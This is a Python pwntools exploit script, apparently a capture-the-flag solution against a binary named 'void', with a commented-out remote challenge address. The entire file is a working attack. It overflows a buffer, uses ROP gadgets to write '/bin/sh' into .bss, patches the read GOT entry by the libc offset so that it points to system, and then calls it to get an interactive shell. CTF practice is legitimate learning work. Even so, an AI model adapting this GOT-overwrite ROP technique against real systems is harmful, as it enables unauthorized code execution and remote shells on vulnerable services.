from pwn import *

context.arch = 'amd64'

#p = remote('138.68.162.218', 30569)
p = process('./void')
gdb.attach(p, api=True)

libc_elf = ELF("./libc.so.6")
elf = ELF("./void")

read_got = elf.got['read']
libc_system = libc_elf.symbols['system']
libc_read = libc_elf.symbols['read']

system_offset = libc_system - libc_read
log.info('system offset in libc from read: {}'.format(hex(system_offset)))
system_offset = system_offset & 0xffffffffffffffff
log.info('Twos complement of this offset: {}'.format(hex(system_offset)))

binsh_addr = elf.bss() + 0x10
log.info('/bin/sh string Address: {}'.format(hex(binsh_addr)))

rsi_r15 = 0x00000000004011b9
gadget = 0x004011b2
add_gadget = 0x0000000000401108
rdi = 0x00000000004011bb
ret = 0x0000000000401016

# stage 1 store string "/bin/sh" in .bss section
payload = b'A'*0x48
payload += p64(rsi_r15) + p64(binsh_addr) + p64(0)
payload += p64(elf.plt['read'])
# Stage 2 change read@GOT to system@GOT
payload += p64(gadget)
payload += p64(system_offset) + p64(elf.got['read'] + 0x3d) + p64(0)*4
payload += p64(add_gadget)
# call read("/bin/sh") = system("/bin/sh")
payload += p64(rdi) + p64(binsh_addr)
payload += p64(ret) # padding ret 
payload += p64(elf.plt['read'])

p.send(payload+b'/bin/sh\x00')

p.interactive()
